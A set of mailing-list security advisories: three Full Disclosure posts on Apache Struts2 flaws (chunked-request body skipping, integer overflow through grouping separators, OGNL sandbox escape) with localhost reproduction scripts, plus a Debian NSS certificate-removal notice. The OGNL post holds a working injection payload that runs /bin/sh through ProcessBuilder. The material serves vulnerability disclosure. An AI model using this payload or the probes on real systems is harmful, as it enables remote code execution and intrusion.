message.title: Apache Struts2 REST Plugin Fails to Properly Parse Chunked Requests
message.author: Daniel Owens via Fulldisclosure
message.body:
Description
The Apache Struts2 REST Plugin's (version 7.4.0 and below) `ContentTypeInterceptor.intercept(ActionInvocation)` only 
deserialises a request body and enforces the `struts.rest.content.maxLength` bound when 
`HttpServletRequest#getContentLength()` returns a positive value.  `getContentLength()` returns `-1` whenever the 
`Content-Length` header is absent, which normal and appropriate for any Hypertext Transfer Protocol (HTTP) request sent 
with `Transfer-Encoding: chunked`, so the entire body-processing branch -- including the bounded-reader size check -- 
is skipped for every such request.

Impact
Any client that sends a chunked-encoded request body causes the action to be invoked as though no body had been sent at 
all, with every body field silently left unbound and no exception, warning, or rejection raised to either the caller or 
the server logs.  While a potentially minor or major detail, it is important to note that because the interceptor fails 
to parse the request body, the `struts.rest.content.maxLength` guard provides no protection whatsoever, as the 
`BoundedReader` that enforces it sits inside the branch that chunked requests never enter.  An attacker can, as such, 
submit an arbitrarily large chunked body without the configured size ceiling ever being consulted, and any downstream 
logic that assumes a submitted field was bound -- default-initialisation checks, business validation keyed to a 
now-absent value, and the like -- will silently fall back to whatever behaviour applies when the field was never set.  
It is important to note that the downstream logic is application-specific and that your application may do something 
terribly wrong or may not depending on your specific code -- Apache's Struts2 REST Plugin merely introduces the 
unexpected pathway -- and that interceptor ordering, additional interceptors, etc., may cause the body to still be 
parsed and deserialised, only that the Apache Struts2 REST Plugin will not take part in such activities, which may 
further complicate the severity calculation (if, for example, data flows through the REST Plugin and then into a custom 
JSON deserialiser via another interceptor, the assumed "protections" of the REST Plugin would never have taken place 
and the default path of your code may assume an INDEX or similar request).

Examples
Sample Code
`intercept(ActionInvocation)` guards the entire body-deserialisation and size-enforcement block on 
`request.getContentLength() > 0`, so a chunked request -- for which `getContentLength()` legitimately returns `-1` -- 
falls straight through to `invocation.invoke()` with the body never read.

```java
    public String intercept(ActionInvocation invocation) throws Exception {
        HttpServletRequest request = ServletActionContext.getRequest();
        ContentTypeHandler handler = selector.getHandlerForRequest(request);

        Object target = invocation.getAction();
        if (target instanceof ModelDriven) {
            target = ((ModelDriven<?>) target).getModel();
        }

        if (request.getContentLength() > 0) {
            BoundedReader reader = new BoundedReader(openBodyReader(request), maxLength);
            try {
                applyRequestBody(invocation, handler, target, reader);
            } catch (Exception e) {
                if (reader.limitExceeded()) {
                    throw requestBodyTooLarge();
                }
                throw e;
            }
            if (reader.limitExceeded()) {
                throw requestBodyTooLarge();
            }
        }
        return invocation.invoke();
    }
```
Code snippet from `struts2-rest-plugin`'s 
plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeInterceptor.java, lines 114-138, with line 123's `if 
(request.getContentLength() > 0)` gating both `applyRequestBody()` and every `BoundedReader`/`maxLength` check; nothing 
in this method, or any upstream code, separately inspects `Transfer-Encoding` and handles chunked encoding

Sample Dynamic Testing
The following was against the rest-showcase codebase, running Struts 7.5.0-SNAPSHOT, built on 28 October 2026.  The 
first, an ordinary `Content-Length`-bearing submission, correctly binds `clientName` and creates a new order.  The 
second, a byte-identical JavaScript Object Notation (JSON) body sent with `Transfer-Encoding: chunked` and no 
`Content-Length` header, is never bound onto the model at all -- `validate()` fires against `clientName`'s untouched 
Java default and the action rejects the request with only the ordinary field-validation error a caller would see for a 
genuinely empty submission.  Importantly, how the information system behaves is dependent on the information system, 
itself, so while the rest-showcase example behaves as such, yours may do something considerably worse.

```http
POST /rest-showcase/orders HTTP/1.1
Host: 127.0.0.1:8383
Content-Type: application/json
Accept: application/json
Content-Length: 47

{"clientName":"CalibrationNormal","amount":11}
```
Request -- an ordinary, `Content-Length`-bearing submission

```http
HTTP/1.1 201
Location: http://127.0.0.1:8383/rest-showcase/orders/6
```
Response -- `201`; the order is created with `clientName` correctly bound from the submitted body

```http
POST /rest-showcase/orders HTTP/1.1
Host: 127.0.0.1:8383
Content-Type: application/json
Accept: application/json
Transfer-Encoding: chunked

2f\r
{"clientName":"CalibrationChunked","amount":22}\r
0\r
\r

```
Request -- the byte-identical JavaScript Object Notation (JSON) body, now sent with `Transfer-Encoding: chunked` and 
without a `Content-Length` header

```http
HTTP/1.1 400
Content-Type: application/json;charset=UTF-8

{"actionErrors":[],"fieldErrors":{"clientName":["The client name is empty"]}}
```
Response -- `400`; `clientName` was never bound, so `validate()` rejects the request as though an empty body had been 
submitted with no indication that the chunked encoding itself was the cause; a subsequent `GET 
/rest-showcase/orders.json` confirms that no order named `CalibrationChunked` was ever created whilst the first 
request's `CalibrationNormal` order (`id: 6`) is present

Steps to Reproduce
Run the following self-contained script against a running rest-showcase deployment. It creates one order via an 
ordinary request, attempts to create a second via a chunked request, confirms the chunked attempt was never bound, and 
cleans up the one order it legitimately created, independently re-verifying the cleanup succeeded.

```python
#!/usr/bin/env python3
"""Standalone reproduction for "`Content-Length` Guard Skips Chunked Request
Body Processing" against the struts2-rest-plugin's ContentTypeInterceptor,
exercised live through rest-showcase's OrdersController.

Requires `pip install requests`.
"""
import sys
import time
import requests

BASE_URL = "http://127.0.0.1:8383/rest-showcase";


def chunked_body(payload: bytes):
    # A generator body forces requests/urllib3 to send Transfer-Encoding:
    # chunked with no Content-Length header at all -- the standard
    # mechanism several HTTP client libraries use for streamed bodies
    yield payload


def list_order_ids() -> set:
    response = requests.get(f"{BASE_URL}/orders.json", timeout=20)
    response.raise_for_status()
    return {order["id"] for order in response.json()}


def main() -> bool:
    marker = str(int(time.time() * 1000))
    normal_name = f"ChunkedGuardNormal-{marker}"
    chunked_name = f"ChunkedGuardChunked-{marker}"

    baseline_ids = list_order_ids()
    print(f"baseline order ids: {sorted(baseline_ids)}")

    # 1) Ordinary, Content-Length-bearing POST -- the control case
    normal_body = f'{{"clientName":"{normal_name}","amount":11}}'.encode("utf-8")
    normal_response = requests.post(
        f"{BASE_URL}/orders",
        data=normal_body,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=20,
    )
    print(f"normal POST -> HTTP {normal_response.status_code}, "
          f"Location={normal_response.headers.get('Location')}")

    after_normal_ids = list_order_ids()
    created_ids = after_normal_ids - baseline_ids
    normal_created = normal_response.status_code == 201 and len(created_ids) == 1
    if not normal_created:
        print("FAIL: the control (Content-Length) request did not create an order as expected")
        return False
    created_id = created_ids.pop()
    print(f"control request created order {created_id} ({normal_name}) -- binding works normally")

    # 2) Byte-identical JSON, sent via a generator body
    chunked_payload = f'{{"clientName":"{chunked_name}","amount":22}}'.encode("utf-8")
    chunked_response = requests.post(
        f"{BASE_URL}/orders",
        data=chunked_body(chunked_payload),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=20,
    )
    sent_headers = chunked_response.request.headers
    print(f"chunked POST -> HTTP {chunked_response.status_code}")
    print(f"outbound request headers: Transfer-Encoding={sent_headers.get('Transfer-Encoding')}, "
          f"Content-Length={sent_headers.get('Content-Length')}")

    after_chunked_ids = list_order_ids()
    chunked_created = len(after_chunked_ids - after_normal_ids) > 0

    vulnerable = (
        sent_headers.get("Transfer-Encoding") == "chunked"
        and "Content-Length" not in sent_headers
        and chunked_response.status_code == 400
        and not chunked_created
    )

    if vulnerable:
        print(f"VULNERABLE: the chunked request's body was never bound onto the model -- "
              f"OrdersController.validate() rejected it with HTTP {chunked_response.status_code} "
              f"({chunked_response.json()}), and no order named {chunked_name!r} was ever created, "
              f"even though the byte-identical body succeeded moments earlier when sent with "
              f"Content-Length instead.")
    else:
        print("did not reproduce")

    # Cleanup: remove the one order this script legitimately created, then
    # independently re-verify the cleanup actually took effect. The chunked
    # request never created anything, so there is nothing to delete for it
    delete_response = requests.delete(f"{BASE_URL}/orders/{created_id}", timeout=20)
    print(f"cleanup: DELETE /orders/{created_id} -> HTTP {delete_response.status_code}")
    final_ids = list_order_ids()
    if created_id in final_ids:
        print(f"WARNING: cleanup did not remove order {created_id}; remove it manually")
    else:
        print(f"cleanup verified: order {created_id} no longer present (back to baseline)")

    return vulnerable


if __name__ == "__main__":
    sys.exit(0 if main() else 1)
```

message.title: Apache Struts2 Core Integer Overflow
message.author: Daniel Owens via Fulldisclosure
message.body:
Description
Apache Struts2 Core version 7.4.0 and below fails to properly prevent integer overflows, causing wrap-arounds and other 
issues on a downstream forced casting into types smaller than `BigInteger`.  Importantly, this finding underscores why 
all applications using Struts and other such platforms should perform their own input validation checks and not blindly 
assume that the upstream Struts2 code has done as such, but the finding also shows that input passed from the upstream 
provider may not faithfully represent what the user provided.

Impact
An attacker who can influence a parameter bound to a boxed `Byte`, `Short`, `Integer`, `Long`, or `Character` action 
property can submit a numeric string that is both out of range for the target type and formatted using the resolved 
locale's grouping separator (e.g. `"2,147,483,648"` under `en_US`) to make `isInRange` silently return `true` instead 
of correctly rejecting the value.  Since the swallowed `NumberFormatException` never reaches the caller, execution 
proceeds into `DefaultTypeConverter.convertValue`, where the oversized value is narrowed with an unchecked cast such as 
`(int) longValue(value)`, silently wrapping it into the target type's range ("2,147,483,648" becomes `-2147483648` for 
an `Integer` field) instead of raising the `TypeConversionException` the overflow guard is supposed to produce.  This 
lets a value the application assumes was range-validated reach downstream business logic as an unexpected negative, 
zero, or otherwise mismatched figure, which can corrupt quantity, monetary, identifier, or other numeric computations 
and any authorisation or business-rule decision that depends on the converted value being bounded and faithful to the 
caller's submitted intent.

Examples
Sample Code
`NumberConverter.convertValue`, in `core/src/main/java/org/apache/struts2/conversion/impl/NumberConverter.java`, parses 
a request string using a grouping-aware `NumberFormat` and then calls `isInRange` with the original, still-grouped 
string to confirm the parsed value is within bounds for the target numeric type; `isInRange` re-parses that same 
grouped string with `new BigInteger`, and its `catch` block treats the resulting `NumberFormatException` as 
confirmation that the value is in range.  Once `isInRange` has incorrectly reported that the value is acceptable, 
control returns to `NumberConverter.convertValue`, which delegates to `DefaultTypeConverter.convertValue`; for an 
`Integer`-typed target this narrows the value with an unchecked cast, producing the actual silent wraparound.

```java
            } else {
                if (stringValue.isEmpty()) {
                    return null;
                }
                NumberFormat numFormat = NumberFormat.getInstance(getLocale(context));
                ParsePosition parsePos = new ParsePosition(0);
                if (isIntegerType(toType)) {
                    numFormat.setParseIntegerOnly(true);
                }
                numFormat.setGroupingUsed(true);
                Number number = numFormat.parse(stringValue, parsePos);

                if (parsePos.getIndex() != stringValue.length()) {
                    throw new TypeConversionException("Unparseable number: \"" + stringValue + "\" at position "
                        + parsePos.getIndex());
                } else {
                    if (!isInRange(number, stringValue, toType))
                        throw new TypeConversionException("Overflow or underflow casting: \"" + stringValue + "\" into 
class " + number.getClass().getName());

                    value = super.convertValue(context, number, toType);
                }
            }
```
Code snippet from `struts2-core`'s core/src/main/java/org/apache/struts2/conversion/impl/NumberConverter.java, lines 
57-78

```java
            } else if (int.class == toType || Integer.class == toType) {
                bigValue = new BigInteger(stringValue);
                lowerBound = BigInteger.valueOf(Integer.MIN_VALUE);
                upperBound = BigInteger.valueOf(Integer.MAX_VALUE);
            } else if (long.class == toType || Long.class == toType) {
                bigValue = new BigInteger(stringValue);
                lowerBound = BigInteger.valueOf(Long.MIN_VALUE);
                upperBound = BigInteger.valueOf(Long.MAX_VALUE);
            } else {
                throw new IllegalArgumentException("Unexpected numeric type: " + toType.getName());
            }
        } catch (NumberFormatException e) {
            //shoult it fail here? BigInteger doesnt seem to be so nice parsing numbers as NumberFormat
            return true;
        }
```
Snippet from `struts2-core`'s core/src/main/java/org/apache/struts2/conversion/impl/NumberConverter.java, lines 209-222

```java
if ((toType == Integer.class) || (toType == Integer.TYPE))
    result = (int) longValue(value);
```
Code snippet from `struts2-core`'s core/src/main/java/org/apache/struts2/conversion/impl/DefaultTypeConverter.java, 
lines 122-123, showing the casting to `int` that causes the wrap-around

Sample Request-Response Pairs
`org.apache.struts2.showcase.ajax.Example5Action`, reachable via `/showcase/showcase/ajax/example5.action`, exposes a 
boxed `Integer age` property behind a `@StrutsParameter`-annotated setter, so the overflow guard bypass in 
`struts2-core` is reachable through this action's ordinary input binding.  The four live probes below, each issued on a 
freshly established session with devMode's `DebuggingInterceptor` set to `debug=command&expression=age` so that the 
bound value can be read straight off the per-request value stack, isolate the defect to the comma -- the first probe 
submits `Integer.MAX_VALUE + 1` with a grouping separator and receives the wrapped, unrelated negative value; the first 
control submits the identical magnitude without a comma and that is correctly rejected; the second control submits a 
genuinely in-range grouped value that converts correctly; and the third control submits a bare baseline value that 
converts correctly.

```http
GET 
/showcase/showcase/ajax/example5.action?age=2%2C147%2C483%2C648&name=overflow-grouped-probe&debug=command&expression=age
 HTTP/1.1
Host: 127.0.0.1:8383
```
A request containing a value too large to fit in an `int` -- `age=2,147,483,648` (`Integer.MAX_VALUE + 1`)

```http
HTTP/1.1 200
Content-Type: text/plain;charset=ISO-8859-1
Content-Length: 11

-2147483648
```
The server accepts the request and the parameter bypasses the overflow guard, is cast to an `int`, and wraps-around to 
`-2147483648` instead of raising a `TypeConversionException`

```http
GET /showcase/showcase/ajax/example5.action?age=2147483648&name=overflow-ungrouped-control&debug=command&expression=age 
HTTP/1.1
Host: 127.0.0.1:8383
```
A request containing a value too large to fit in an `int` -- `age=2147483648` -- but without a grouping separator

```http
HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 3154

<!-- ... --><html>...<title>Struts Problem Report</title>...
```
The server correctly rejects the value, catching the overflow

```http
GET /showcase/showcase/ajax/example5.action?age=1%2C234&name=in-range-grouped-control&debug=command&expression=age 
HTTP/1.1
Host: 127.0.0.1:8383
```
Control request -- `age=1,234` -- an in-range, comma-grouped number

```http
HTTP/1.1 200
Content-Type: text/plain;charset=ISO-8859-1
Content-Length: 4

1234
```
Response showing that numbers with commas that remain in-bounds stay as such and are properly interpreted

```http
GET /showcase/showcase/ajax/example5.action?age=42&name=baseline-control&debug=command&expression=age HTTP/1.1
Host: 127.0.0.1:8383
```
Control request -- `age=42` -- a bare baseline value

```http
HTTP/1.1 200
Content-Type: text/plain;charset=ISO-8859-1
Content-Length: 2

42
```
Response showing correct conversion, as one would expect

Steps to Reproduce
This is intended to run against a system using the showcase example.  Remember that the issue is locale-aware, so your 
grouping may not be via commas.

```zsh
#!/usr/bin/env zsh

BASE_URL="http://127.0.0.1 :8383/showcase/showcase/ajax/example5.action"

echo "=== Vulnerable probe: age=2,147,483,648 (Integer.MAX_VALUE + 1, comma-grouped) ==="
curl -i -s --get \
  --data-urlencode "age=2,147,483,648" \
  --data-urlencode "name=overflow-grouped-probe" \
  --data-urlencode "debug=command" \
  --data-urlencode "expression=age" \
  "$BASE_URL"

echo "\n\n=== Control 1: age=2147483648 (identical magnitude, no grouping separator) ==="
curl -i -s --get \
  --data-urlencode "age=2147483648" \
  --data-urlencode "name=overflow-ungrouped-control" \
  --data-urlencode "debug=command" \
  --data-urlencode "expression=age" \
  "$BASE_URL"

echo "\n\n=== Control 2: age=1,234 (genuinely in-range, comma-grouped) ==="
curl -i -s --get \
  --data-urlencode "age=1,234" \
  --data-urlencode "name=in-range-grouped-control" \
  --data-urlencode "debug=command" \
  --data-urlencode "expression=age" \
  "$BASE_URL"

echo "\n\n=== Control 3: age=42 (bare baseline) ==="
curl -i -s --get \
  --data-urlencode "age=42" \
  --data-urlencode "name=baseline-control" \
  --data-urlencode "debug=command" \
  --data-urlencode "expression=age" \
  "$BASE_URL"
```

message.title: Apache Struts2 Core Arbitrary Code Execution via OGNL Sandbox Escape
message.author: Daniel Owens via Fulldisclosure
message.body:
Description
Apache Struts2 Core version 7.4.0 and below attempt to prevent arbitrary code execution via Object-Graph Navigation 
Language (OGNL) through several different mechanisms but only in a cursory fashion -- the libraries only guard against 
immediate calls evaluated by the OGNL engine via `SecurityMemberAccess`, but an allowed call that, instead, accepts 
nested arguments and, itself, invokes reflection internally executes outside of the scope of said cursory protections, 
thereby enabling attackers to bypass the limited protections entirely.

It should be noted that this attack, obviously, only works in locations where the information system runs the 
input/output through an OGNL parser and executor.  Moreover, there is a key difference between Struts2 Core 6.x and 
below and 7.x -- 7.x favours a whitelist-based approach that is coupled with some blacklisting, while 6.x and below 
only check a blacklist (if anything at all).  This means that for successful exploitation in 6.x and below, attackers 
can simply find a call that uses reflection and that isn't explicitly blacklisted (e.g., `java.beans.Statement` and 
`java.beans.Expression`), embed the otherwise disallowed reflective call, and watch it run.  In 7.x, however, attackers 
must use something that has been explicitly allowed, first, as the wrapper, which raises the bar for exploitation, 
reducing the likelihood for most systems running 7.x (if someone does not realise that the Struts2 Core library only 
provides cursory protections, they will not understand the risk and may accidentally add something like 
`java.beans.Statement`), but does not reduce the impact or eliminate the risk.

Impact
Attackers can bypass the Apache Struts2 Core and OGNL library's protections against arbitrary code execution via 
malicious OGNL through nested calls, thereby executing arbitrary code on the information system.  Importantly, through 
this, attackers can bypass not only the class/method checks, but also the static/non-static checks, allowing attackers 
to, for example, call to `ProcessBuilder`, dump the environment variables via `System.getenv(String)`, and various 
other such calls.

Steps to Reproduce
Sample Query
The following will work on Apache Struts2 Core versions 6.x and below (assuming that `query` runs through the OGNL 
parser, etc. -- this can happen on the request, but also if the string is reflected back in, say, a JSP via tags that 
do as such) without much effort.  On Apache Struts2 Core 7.x, though, `java.beans.Expression` would need to be 
whitelisted, first.

GET 
/search.action?query=new+java.beans.Expression(new+java.beans.Expression(%40java.lang.ProcessBuilder%40class,'new',new+Object%5B%5D%7Bnew+String%5B%5D%7B'/bin/sh','-c','id+%3E+%3C%3CREPLACE+ME+--+a+fresh+marker+file+path%3E%3E'%7D%7D).getValue(),'start',new+Object%5B0%5D).getValue()

message.title: [Bugtraq] [SECURITY] [DSA 6599-1] nss security update
message.author: Salvatore Bonaccorso
message.body:
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
- -------------------------------------------------------------------------
Debian Security Advisory DSA-6599-1                   security@debian.org

Package        : nss
It was discovered that several eMudhra intermediate CA certificates have
been compromised. Updated nss packages are provided to remove the
"eMudhra emSign Root CA - G3", "eMudhra emSign Root CA - C1" and "emSign
ECC Root CA - C3" certificates.
For the stable distribution (trixie), this problem has been fixed in
version 2:3.110-1+deb13u5.
We recommend that you upgrade your nss packages.
For the detailed security status of nss please refer to its security
tracker page at:
https://security-tracker.debian.org/tracker/nss
Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: https://www.debian.org/security/
Mailing list: debian-security-announce@lists.debian.org
